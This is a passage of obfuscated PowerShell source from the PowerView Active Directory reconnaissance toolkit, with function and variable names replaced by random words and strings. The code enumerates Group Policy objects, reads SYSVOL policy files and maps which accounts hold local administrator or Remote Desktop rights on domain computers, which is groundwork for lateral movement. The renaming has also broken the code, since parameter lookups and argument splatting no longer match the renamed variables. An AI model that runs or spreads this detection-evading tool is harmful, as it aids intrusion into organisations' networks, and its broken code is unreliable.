                $PYYRJVwT99 = @()
                $PYYRJVwT99 += $azPUroAG99.split(',') | ForEach-Object {
                    if($_.startswith('OU=')) {
                        $azPUroAG99.SubString($azPUroAG99.IndexOf("$($_),"))
                    }
                }
                Write-Verbose "[dishonesty] object OUs: $PYYRJVwT99"
                if ($PYYRJVwT99) {
                    $zLdPCUTB99.Remove('Properties')
                    $vtTLveXx99 = $False
                    ForEach($xXHydQxR99 in $PYYRJVwT99) {
                        $zLdPCUTB99['Identity'] = $xXHydQxR99
                        $dvghvbls99 += disproved @SearcherArguments | ForEach-Object {
                            if ($_.gplink) {
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $Parts = $_.split(';')
                                        $GpoDN = $Parts[0]
                                        $rGyaswfT99 = $Parts[1]
                                        if ($vtTLveXx99) {
                                            if ($rGyaswfT99 -eq 2) {
                                                $GpoDN
                                            }
                                        }
                                        else {
                                            $GpoDN
                                        }
                                    }
                                }
                            }
                            if ($_.gpoptions -eq 1) {
                                $vtTLveXx99 = $True
                            }
                        }
                    }
                }
                if ($uiVSlknQ99) {
                    $hRJGaLjQ99 = (censoring -kyzUdCPm99 $uiVSlknQ99).SiteName
                    if($hRJGaLjQ99 -and ($hRJGaLjQ99 -notlike 'Error*')) {
                        $zLdPCUTB99['Identity'] = $hRJGaLjQ99
                        $dvghvbls99 += bandannas @SearcherArguments | ForEach-Object {
                            if($_.gplink) {
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $_.split(';')[0]
                                    }
                                }
                            }
                        }
                    }
                }
                $mmCsScYj99 = $azPUroAG99.SubString($azPUroAG99.IndexOf('DC='))
                $zLdPCUTB99.Remove('Identity')
                $zLdPCUTB99.Remove('Properties')
                $zLdPCUTB99['LDAPFilter'] = "(objectclass=domain)(distinguishedname=$mmCsScYj99)"
                $dvghvbls99 += cupped @SearcherArguments | ForEach-Object {
                    if($_.gplink) {
                        $_.gplink.split('][') | ForEach-Object {
                            if ($_.startswith('LDAP')) {
                                $_.split(';')[0]
                            }
                        }
                    }
                }
                Write-Verbose "[dishonesty] GPOAdsPaths: $dvghvbls99"
                if ($vqXskDQd99) { $zLdPCUTB99['Properties'] = $vqXskDQd99 }
                else { $zLdPCUTB99.Remove('Properties') }
                $zLdPCUTB99.Remove('Identity')
                $dvghvbls99 | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
                    $zLdPCUTB99['SearchBase'] = $_
                    $zLdPCUTB99['LDAPFilter'] = "(objectCategory=groupPolicyContainer)"
                    cupped @SearcherArguments | ForEach-Object {
                        if ($PSBoundParameters['Raw']) {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                        }
                        else {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                        }
                        $_
                    }
                }
            }
            else {
                $waAVGUFD99 = ''
                $nQZyhrEp99 = ''
                $fqOhNdkk99 | Where-Object {$_} | ForEach-Object {
                    $MFlrbkhb99 = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($MFlrbkhb99 -match 'LDAP://|^CN=.*') {
                        $waAVGUFD99 += "(distinguishedname=$MFlrbkhb99)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            $cIRoWbek99 = $MFlrbkhb99.SubString($MFlrbkhb99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[dishonesty] Extracted domain '$cIRoWbek99' from '$MFlrbkhb99'"
                            $zLdPCUTB99['Domain'] = $cIRoWbek99
                            $DVgeqsrg99 = breading @SearcherArguments
                            if (-not $DVgeqsrg99) {
                                Write-Warning "[dishonesty] Unable to retrieve domain searcher for '$cIRoWbek99'"
                            }
                        }
                    }
                    elseif ($MFlrbkhb99 -match '{.*}') {
                        $waAVGUFD99 += "(name=$MFlrbkhb99)"
                    }
                    else {
                        try {
                            $yhPDRNjn99 = (-Join (([Guid]$MFlrbkhb99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                            $waAVGUFD99 += "(objectguid=$yhPDRNjn99)"
                        }
                        catch {
                            $waAVGUFD99 += "(displayname=$MFlrbkhb99)"
                        }
                    }
                }
                if ($waAVGUFD99 -and ($waAVGUFD99.Trim() -ne '') ) {
                    $nQZyhrEp99 += "(|$waAVGUFD99)"
                }
                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[dishonesty] Using additional LDAP filter: $gzpPmKdI99"
                    $nQZyhrEp99 += "$gzpPmKdI99"
                }
                $DVgeqsrg99.filter = "(&(objectCategory=groupPolicyContainer)$nQZyhrEp99)"
                Write-Verbose "[dishonesty] filter string: $($DVgeqsrg99.filter)"
                if ($PSBoundParameters['FindOne']) { $NtqBcYnO99 = $DVgeqsrg99.FindOne() }
                else { $NtqBcYnO99 = $DVgeqsrg99.FindAll() }
                $NtqBcYnO99 | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        $GPO = $_
                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                    }
                    else {
                        if ($PSBoundParameters['SearchBase'] -and ($MBPsLBEN99 -Match '^GC://')) {
                            $GPO = decaffeinating -PvRupVWt99 $_.Properties
                            try {
                                $GPODN = $GPO.distinguishedname
                                $dBWmcTBE99 = $GPODN.SubString($GPODN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                                $xOyylchl99 = "\\$dBWmcTBE99\SysVol\$dBWmcTBE99\Policies\$($GPO.cn)"
                                $GPO | Add-Member Noteproperty 'gpcfilesyspath' $xOyylchl99
                            }
                            catch {
                                Write-Verbose "[dishonesty] Error calculating gpcfilesyspath for: $($GPO.distinguishedname)"
                            }
                        }
                        else {
                            $GPO = decaffeinating -PvRupVWt99 $_.Properties
                        }
                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                    }
                    $GPO
                }
                if ($NtqBcYnO99) {
                    try { $NtqBcYnO99.dispose() }
                    catch {
                        Write-Verbose "[dishonesty] Error disposing of the Results object: $_"
                    }
                }
                $DVgeqsrg99.dispose()
            }
        }
    }
}
function Remington {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $fqOhNdkk99,
        [Switch]
        $BEmLlZyn99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $gzpPmKdI99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $MBPsLBEN99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [Switch]
        $CnaAXLuN99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $zLdPCUTB99 = @{}
        if ($PSBoundParameters['Domain']) { $zLdPCUTB99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['LDAPFilter']) { $zLdPCUTB99['LDAPFilter'] = $jeGdZvYa99 }
        if ($PSBoundParameters['SearchBase']) { $zLdPCUTB99['SearchBase'] = $MBPsLBEN99 }
        if ($PSBoundParameters['Server']) { $zLdPCUTB99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $zLdPCUTB99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $zLdPCUTB99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $zLdPCUTB99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['Tombstone']) { $zLdPCUTB99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $zLdPCUTB99['Credential'] = $DOZPHpup99 }
        $AZcgOYJm99 = @{}
        if ($PSBoundParameters['Domain']) { $AZcgOYJm99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['Server']) { $AZcgOYJm99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['Credential']) { $AZcgOYJm99['Credential'] = $DOZPHpup99 }
        $zjqdgHAs99 = [System.StringSplitOptions]::RemoveEmptyEntries
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $zLdPCUTB99['Identity'] = $fqOhNdkk99 }
        dishonesty @SearcherArguments | ForEach-Object {
            $wtGlWREM99 = $_.displayname
            $eItNVieP99 = $_.name
            $PQlwICwf99 = $_.gpcfilesyspath
            $zavQEXuo99 =  @{ 'GptTmplPath' = "$PQlwICwf99\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf" }
            if ($PSBoundParameters['Credential']) { $zavQEXuo99['Credential'] = $DOZPHpup99 }
            $Inf = adore @ParseArgs
            if ($Inf -and ($Inf.psbase.Keys -contains 'Group Membership')) {
                $dFnEuMjh99 = @{}
                ForEach ($cnpuFIVf99 in $Inf.'Group Membership'.GetEnumerator()) {
                    $Group, $LTQiAGVM99 = $cnpuFIVf99.Key.Split('__', $zjqdgHAs99) | ForEach-Object {$_.Trim()}
                    $ZyJdFBrA99 = $cnpuFIVf99.Value | Where-Object {$_} | ForEach-Object { $_.Trim('*') } | Where-Object {$_}
                    if ($PSBoundParameters['ResolveMembersToSIDs']) {
                        $MYzZceXL99 = @()
                        ForEach ($BlVyUnEr99 in $ZyJdFBrA99) {
                            if ($BlVyUnEr99 -and ($BlVyUnEr99.Trim() -ne '')) {
                                if ($BlVyUnEr99 -notmatch '^S-1-.*') {
                                    $YLbmasnp99 = @{'ObjectName' = $BlVyUnEr99}
                                    if ($PSBoundParameters['Domain']) { $YLbmasnp99['Domain'] = $jeGdZvYa99 }
                                    $qiSfawjM99 = Ptolemy @ConvertToArguments
                                    if ($qiSfawjM99) {
                                        $MYzZceXL99 += $qiSfawjM99
                                    }
                                    else {
                                        $MYzZceXL99 += $BlVyUnEr99
                                    }
                                }
                                else {
                                    $MYzZceXL99 += $BlVyUnEr99
                                }
                            }
                        }
                        $ZyJdFBrA99 = $MYzZceXL99
                    }
                    if (-not $dFnEuMjh99[$Group]) {
                        $dFnEuMjh99[$Group] = @{}
                    }
                    if ($ZyJdFBrA99 -isnot [System.Array]) {$ZyJdFBrA99 = @($ZyJdFBrA99)}
                    $dFnEuMjh99[$Group].Add($LTQiAGVM99, $ZyJdFBrA99)
                }
                ForEach ($cnpuFIVf99 in $dFnEuMjh99.GetEnumerator()) {
                    if ($cnpuFIVf99 -and $cnpuFIVf99.Key -and ($cnpuFIVf99.Key -match '^\*')) {
                        $NORXAZEg99 = $cnpuFIVf99.Key.Trim('*')
                        if ($NORXAZEg99 -and ($NORXAZEg99.Trim() -ne '')) {
                            $sWPGjowW99 = bandaging -ObjectSID $NORXAZEg99 @ConvertArguments
                        }
                        else {
                            $sWPGjowW99 = $False
                        }
                    }
                    else {
                        $sWPGjowW99 = $cnpuFIVf99.Key
                        if ($sWPGjowW99 -and ($sWPGjowW99.Trim() -ne '')) {
                            if ($sWPGjowW99 -match 'Administrators') {
                                $NORXAZEg99 = 'S-1-5-32-544'
                            }
                            elseif ($sWPGjowW99 -match 'Remote Desktop') {
                                $NORXAZEg99 = 'S-1-5-32-555'
                            }
                            elseif ($sWPGjowW99 -match 'Guests') {
                                $NORXAZEg99 = 'S-1-5-32-546'
                            }
                            elseif ($sWPGjowW99.Trim() -ne '') {
                                $YLbmasnp99 = @{'ObjectName' = $sWPGjowW99}
                                if ($PSBoundParameters['Domain']) { $YLbmasnp99['Domain'] = $jeGdZvYa99 }
                                $NORXAZEg99 = Ptolemy @ConvertToArguments
                            }
                            else {
                                $NORXAZEg99 = $Null
                            }
                        }
                    }
                    $vEVCkcvW99 = New-Object PSObject
                    $vEVCkcvW99 | Add-Member Noteproperty 'GPODisplayName' $wtGlWREM99
                    $vEVCkcvW99 | Add-Member Noteproperty 'GPOName' $eItNVieP99
                    $vEVCkcvW99 | Add-Member Noteproperty 'GPOPath' $PQlwICwf99
                    $vEVCkcvW99 | Add-Member Noteproperty 'GPOType' 'RestrictedGroups'
                    $vEVCkcvW99 | Add-Member Noteproperty 'Filters' $Null
                    $vEVCkcvW99 | Add-Member Noteproperty 'GroupName' $sWPGjowW99
                    $vEVCkcvW99 | Add-Member Noteproperty 'GroupSID' $NORXAZEg99
                    $vEVCkcvW99 | Add-Member Noteproperty 'GroupMemberOf' $cnpuFIVf99.Value.Memberof
                    $vEVCkcvW99 | Add-Member Noteproperty 'GroupMembers' $cnpuFIVf99.Value.Members
                    $vEVCkcvW99.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                    $vEVCkcvW99
                }
            }
            $zavQEXuo99 =  @{
                'GroupsXMLpath' = "$PQlwICwf99\MACHINE\Preferences\Groups\Groups.xml"
            }
            strapping @ParseArgs | ForEach-Object {
                if ($PSBoundParameters['ResolveMembersToSIDs']) {
                    $MYzZceXL99 = @()
                    ForEach ($BlVyUnEr99 in $_.GroupMembers) {
                        if ($BlVyUnEr99 -and ($BlVyUnEr99.Trim() -ne '')) {
                            if ($BlVyUnEr99 -notmatch '^S-1-.*') {
                                $YLbmasnp99 = @{'ObjectName' = $sWPGjowW99}
                                if ($PSBoundParameters['Domain']) { $YLbmasnp99['Domain'] = $jeGdZvYa99 }
                                $qiSfawjM99 = Ptolemy -jeGdZvYa99 $jeGdZvYa99 -tFiqSWVt99 $BlVyUnEr99
                                if ($qiSfawjM99) {
                                    $MYzZceXL99 += $qiSfawjM99
                                }
                                else {
                                    $MYzZceXL99 += $BlVyUnEr99
                                }
                            }
                            else {
                                $MYzZceXL99 += $BlVyUnEr99
                            }
                        }
                    }
                    $_.GroupMembers = $MYzZceXL99
                }
                $_ | Add-Member Noteproperty 'GPODisplayName' $wtGlWREM99
                $_ | Add-Member Noteproperty 'GPOName' $eItNVieP99
                $_ | Add-Member Noteproperty 'GPOType' 'GroupPolicyPreferences'
                $_.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                $_
            }
        }
    }
}
function matchsticks {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOUserLocalGroupMapping')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $fqOhNdkk99,
        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $qapxisbo99 = 'Administrators',
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $MBPsLBEN99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [Switch]
        $CnaAXLuN99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $UhzOAmKr99 = @{}
        if ($PSBoundParameters['Domain']) { $UhzOAmKr99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['Server']) { $UhzOAmKr99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $UhzOAmKr99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $UhzOAmKr99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $UhzOAmKr99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['Tombstone']) { $UhzOAmKr99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $UhzOAmKr99['Credential'] = $DOZPHpup99 }
    }
    PROCESS {
        $LsRpjIVj99 = @()
        if ($PSBoundParameters['Identity']) {
            $LsRpjIVj99 += cupped @CommonArguments -fqOhNdkk99 $fqOhNdkk99 | Select-Object -Expand objectsid
            $llFVnvan99 = $LsRpjIVj99
            if (-not $LsRpjIVj99) {
                Throw "[matchsticks] Unable to retrieve SID for identity '$fqOhNdkk99'"
            }
        }
        else {
            $LsRpjIVj99 = @('*')
        }
        if ($qapxisbo99 -match 'S-1-5') {
            $hfPNjhuA99 = $qapxisbo99
        }
        elseif ($qapxisbo99 -match 'Admin') {
            $hfPNjhuA99 = 'S-1-5-32-544'
        }
        else {
            $hfPNjhuA99 = 'S-1-5-32-555'
        }
        if ($LsRpjIVj99[0] -ne '*') {
            ForEach ($nmAqQmMs99 in $LsRpjIVj99) {
                Write-Verbose "[matchsticks] Enumerating nested group memberships for: '$nmAqQmMs99'"
                $LsRpjIVj99 += deform @CommonArguments -PvRupVWt99 'objectsid' -LlOLytFc99 $nmAqQmMs99 | Select-Object -ExpandProperty objectsid
            }
        }
        Write-Verbose "[matchsticks] Target localgroup SID: $hfPNjhuA99"
        Write-Verbose "[matchsticks] Effective target domain SIDs: $LsRpjIVj99"
        $AMtoxWSS99 = Remington @CommonArguments -BEmLlZyn99 | ForEach-Object {
            $vEVCkcvW99 = $_
            if ($vEVCkcvW99.GroupSID -match $hfPNjhuA99) {
                $vEVCkcvW99.GroupMembers | Where-Object {$_} | ForEach-Object {
                    if ( ($LsRpjIVj99[0] -eq '*') -or ($LsRpjIVj99 -Contains $_) ) {
                        $vEVCkcvW99
                    }
                }
            }
            if ( ($vEVCkcvW99.GroupMemberOf -contains $hfPNjhuA99) ) {
                if ( ($LsRpjIVj99[0] -eq '*') -or ($LsRpjIVj99 -Contains $vEVCkcvW99.GroupSID) ) {
                    $vEVCkcvW99
                }
            }
        } | Sort-Object -Property GPOName -Unique
        $AMtoxWSS99 | Where-Object {$_} | ForEach-Object {
            $eItNVieP99 = $_.GPODisplayName
            $xxkTKugy99 = $_.GPOName
            $PQlwICwf99 = $_.GPOPath
            $GdWknNAN99 = $_.GPOType
            if ($_.GroupMembers) {
                $JmPHvEwV99 = $_.GroupMembers
            }
            else {
                $JmPHvEwV99 = $_.GroupSID
            }
            $hruVLUod99 = $_.Filters
            if ($LsRpjIVj99[0] -eq '*') {
                $lhCbUPRj99 = $JmPHvEwV99
            }
            else {
                $lhCbUPRj99 = $llFVnvan99
            }
            disproved @CommonArguments -Raw -PvRupVWt99 'name,distinguishedname' -LOeOPkcr99 $xxkTKugy99 | ForEach-Object {
                if ($hruVLUod99) {
                    $IOJqevQI99 = boozed @CommonArguments -PvRupVWt99 'dnshostname,distinguishedname' -MBPsLBEN99 $_.Path | Where-Object {$_.distinguishedname -match ($hruVLUod99.Value)} | Select-Object -ExpandProperty dnshostname
                }
                else {
                    $IOJqevQI99 = boozed @CommonArguments -PvRupVWt99 'dnshostname' -MBPsLBEN99 $_.Path | Select-Object -ExpandProperty dnshostname
                }
                if ($IOJqevQI99) {
                    if ($IOJqevQI99 -isnot [System.Array]) {$IOJqevQI99 = @($IOJqevQI99)}
                    ForEach ($nmAqQmMs99 in $lhCbUPRj99) {
                        $Object = cupped @CommonArguments -fqOhNdkk99 $nmAqQmMs99 -PvRupVWt99 'samaccounttype,samaccountname,distinguishedname,objectsid'
                        $LvQgjAII99 = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype
                        $lNzugxoA99 = New-Object PSObject
                        $lNzugxoA99 | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                        $lNzugxoA99 | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                        $lNzugxoA99 | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
                        $lNzugxoA99 | Add-Member Noteproperty 'Domain' $jeGdZvYa99
                        $lNzugxoA99 | Add-Member Noteproperty 'IsGroup' $LvQgjAII99
                        $lNzugxoA99 | Add-Member Noteproperty 'GPODisplayName' $eItNVieP99
                        $lNzugxoA99 | Add-Member Noteproperty 'GPOGuid' $xxkTKugy99
                        $lNzugxoA99 | Add-Member Noteproperty 'GPOPath' $PQlwICwf99
                        $lNzugxoA99 | Add-Member Noteproperty 'GPOType' $GdWknNAN99
                        $lNzugxoA99 | Add-Member Noteproperty 'ContainerName' $_.Properties.distinguishedname
                        $lNzugxoA99 | Add-Member Noteproperty 'ComputerName' $IOJqevQI99
                        $lNzugxoA99.PSObject.TypeNames.Insert(0, 'PowerView.GPOLocalGroupMapping')
                        $lNzugxoA99
                    }
                }
            }
            bandannas @CommonArguments -PvRupVWt99 'siteobjectbl,distinguishedname' -LOeOPkcr99 $xxkTKugy99 | ForEach-Object {
                ForEach ($nmAqQmMs99 in $lhCbUPRj99) {
                    $Object = cupped @CommonArguments -fqOhNdkk99 $nmAqQmMs99 -PvRupVWt99 'samaccounttype,samaccountname,distinguishedname,objectsid'
                    $LvQgjAII99 = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype
                    $lNzugxoA99 = New-Object PSObject
                    $lNzugxoA99 | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                    $lNzugxoA99 | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                    $lNzugxoA99 | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
                    $lNzugxoA99 | Add-Member Noteproperty 'IsGroup' $LvQgjAII99
                    $lNzugxoA99 | Add-Member Noteproperty 'Domain' $jeGdZvYa99
                    $lNzugxoA99 | Add-Member Noteproperty 'GPODisplayName' $eItNVieP99
                    $lNzugxoA99 | Add-Member Noteproperty 'GPOGuid' $xxkTKugy99
                    $lNzugxoA99 | Add-Member Noteproperty 'GPOPath' $PQlwICwf99
                    $lNzugxoA99 | Add-Member Noteproperty 'GPOType' $GdWknNAN99
                    $lNzugxoA99 | Add-Member Noteproperty 'ContainerName' $_.distinguishedname
                    $lNzugxoA99 | Add-Member Noteproperty 'ComputerName' $_.siteobjectbl
                    $lNzugxoA99.PSObject.TypeNames.Add('PowerView.GPOLocalGroupMapping')
                    $lNzugxoA99
                }
            }
        }
    }
}
function litterbugs {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GGPOComputerLocalGroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerIdentity')]
    Param(
        [Parameter(Position = 0, ParameterSetName = 'ComputerIdentity', Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ComputerName', 'Computer', 'DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $vILfkrnV99,
        [Parameter(Mandatory = $True, ParameterSetName = 'OUIdentity')]
        [Alias('OU')]
        [String]
        $QUGRERCB99,
        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $qapxisbo99 = 'Administrators',
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $MBPsLBEN99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [Switch]
        $CnaAXLuN99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $UhzOAmKr99 = @{}
        if ($PSBoundParameters['Domain']) { $UhzOAmKr99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['Server']) { $UhzOAmKr99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $UhzOAmKr99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $UhzOAmKr99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $UhzOAmKr99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['Tombstone']) { $UhzOAmKr99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $UhzOAmKr99['Credential'] = $DOZPHpup99 }
    }
    PROCESS {
        if ($PSBoundParameters['ComputerIdentity']) {
            $mNwCUfjR99 = boozed @CommonArguments -fqOhNdkk99 $vILfkrnV99 -PvRupVWt99 'distinguishedname,dnshostname'
            if (-not $mNwCUfjR99) {
                throw "[litterbugs] Computer $vILfkrnV99 not found. Try a fully qualified host name."
            }
            ForEach ($GucPfsvo99 in $mNwCUfjR99) {
                $PmNjQzcA99 = @()
                $DN = $GucPfsvo99.distinguishedname
                $nYEfXuCY99 = $DN.IndexOf('OU=')
                if ($nYEfXuCY99 -gt 0) {
                    $nXkOnEOb99 = $DN.SubString($nYEfXuCY99)
                }
                if ($nXkOnEOb99) {
                    $PmNjQzcA99 += disproved @CommonArguments -MBPsLBEN99 $nXkOnEOb99 -gzpPmKdI99 '(gplink=*)' | ForEach-Object {
                        Select-String -kZBXgWDy99 $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }
                Write-Verbose "Enumerating the sitename for: $($GucPfsvo99.dnshostname)"
                $hRJGaLjQ99 = (censoring -kyzUdCPm99 $GucPfsvo99.dnshostname).SiteName
                if ($hRJGaLjQ99 -and ($hRJGaLjQ99 -notmatch 'Error')) {
                    $PmNjQzcA99 += bandannas @CommonArguments -fqOhNdkk99 $hRJGaLjQ99 -gzpPmKdI99 '(gplink=*)' | ForEach-Object {
                        Select-String -kZBXgWDy99 $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }
                $PmNjQzcA99 | Remington @CommonArguments | Sort-Object -Property GPOName -Unique | ForEach-Object {
                    $vEVCkcvW99 = $_
                    if($vEVCkcvW99.GroupMembers) {
                        $JmPHvEwV99 = $vEVCkcvW99.GroupMembers
                    }
                    else {
                        $JmPHvEwV99 = $vEVCkcvW99.GroupSID
                    }
                    $JmPHvEwV99 | ForEach-Object {
                        $Object = cupped @CommonArguments -fqOhNdkk99 $_
                        $LvQgjAII99 = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype
                        $bUusNxkw99 = New-Object PSObject
                        $bUusNxkw99 | Add-Member Noteproperty 'ComputerName' $GucPfsvo99.dnshostname
                        $bUusNxkw99 | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                        $bUusNxkw99 | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                        $bUusNxkw99 | Add-Member Noteproperty 'ObjectSID' $_
                        $bUusNxkw99 | Add-Member Noteproperty 'IsGroup' $LvQgjAII99
                        $bUusNxkw99 | Add-Member Noteproperty 'GPODisplayName' $vEVCkcvW99.GPODisplayName
                        $bUusNxkw99 | Add-Member Noteproperty 'GPOGuid' $vEVCkcvW99.GPOName
                        $bUusNxkw99 | Add-Member Noteproperty 'GPOPath' $vEVCkcvW99.GPOPath
                        $bUusNxkw99 | Add-Member Noteproperty 'GPOType' $vEVCkcvW99.GPOType
                        $bUusNxkw99.PSObject.TypeNames.Add('PowerView.GPOComputerLocalGroupMember')
                        $bUusNxkw99
                    }
                }
            }
        }
    }
}
function swankest {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Source', 'Name')]
        [String]
        $HqefJcIL99 = 'Domain',
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $zLdPCUTB99 = @{}
        if ($PSBoundParameters['Server']) { $zLdPCUTB99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $zLdPCUTB99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['Credential']) { $zLdPCUTB99['Credential'] = $DOZPHpup99 }
        $AZcgOYJm99 = @{}
        if ($PSBoundParameters['Server']) { $AZcgOYJm99['Server'] = $YdBDxrjg99 }
